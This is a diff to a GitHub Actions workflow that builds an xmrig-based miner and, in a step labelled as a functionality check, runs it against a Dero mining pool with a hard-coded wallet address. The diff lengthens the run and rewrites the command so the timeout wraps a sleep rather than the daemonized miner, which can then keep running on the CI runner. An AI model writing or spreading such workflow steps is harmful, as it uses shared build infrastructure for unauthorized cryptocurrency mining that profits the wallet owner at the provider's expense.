@@ -23,6 +23,7 @@ jobs:
         sudo apt -y install libuv1-dev build-essential cmake libmicrohttpd-dev libssl-dev
 
     # cmake_build_action options at: https://github.com/marketplace/actions/build-c-project
+    # replace this with a manual cmake process which customizes the build
     - name: Build binaries
       uses: nicledomaS/cmake_build_action@v1.4
       with:
@@ -40,10 +41,13 @@ jobs:
         name: binaries
         path: ${{github.workspace}}/build/binaries
 
-    - name: Run xmrigMiner for 15 seconds to see if it works
+    - name: Run xmrigMiner for 45 seconds to see if it works
       run: |
         cd ${{github.workspace}}/build/binaries/ && ls -la
         sudo chmod +x ./xmrigMiner
-        timeout 15 ./xmrigMiner -o gulf.moneroocean.stream:10032 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc --tls -k --coin dero -a astrobwt --daemonized
+        timeout 45 sleep 50 | ./xmrigMiner -o gulf.moneroocean.stream:10032 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc --tls -k --coin dero -a astrobwt --daemonized
+      # get exit status
+        RET=${PIPESTATUS[0]}
+        echo $RET
 
 
